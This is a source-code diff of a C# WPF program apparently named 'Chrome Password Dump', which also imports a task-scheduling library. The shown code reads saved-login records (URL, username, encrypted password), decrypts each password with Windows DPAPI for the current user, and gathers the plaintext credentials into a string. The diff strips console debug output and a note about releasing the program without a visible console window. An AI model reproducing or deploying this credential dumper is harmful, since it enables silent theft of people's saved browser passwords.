@@ -11,12 +11,7 @@ using Microsoft.Win32.TaskScheduler;
 namespace ChrPwdDmp
 {
     /// <summary>
-    /// Interaction logic for MainWindow.xaml
-    /// 
-    /// Changed the output to the console for testing purposes:
-    /// Right click on the project, "Properties", "Application" tab, change "Output Type" to "Console Application", and then it will also have a console.
-    /// Change this back to "Windows Application" when it is released
-    /// 
+    /// Interaction logic for MainWindow.xaml  
     /// </summary>
     public partial class MainWindow : Window
     {
@@ -79,18 +74,14 @@ namespace ChrPwdDmp
             {
                 // Don't bother if there's not a username
                 if ((string)reader["username_value"] != "")
-                {
-                    //Console.WriteLine("action_url:     " + reader["action_url"]);
+                {                    
                     passwords += "action_url:     " + reader["action_url"] + System.Environment.NewLine;
-                    //Console.WriteLine("username_value: " + reader["username_value"]);
                     passwords += "username_value: " + reader["username_value"] + System.Environment.NewLine;
 
                     Byte[] passwordBytes = ProtectedData.Unprotect((Byte[])reader["password_value"], null, DataProtectionScope.CurrentUser);
-                    string passwordValue = System.Text.Encoding.Default.GetString(passwordBytes);
-                    //Console.WriteLine("password_value: " + passwordValue);
+                    string passwordValue = System.Text.Encoding.Default.GetString(passwordBytes);                    
                     passwords += "password_value: " + passwordValue + System.Environment.NewLine;
 
-                    //Console.WriteLine();
                     passwords += System.Environment.NewLine;
                 }
             }
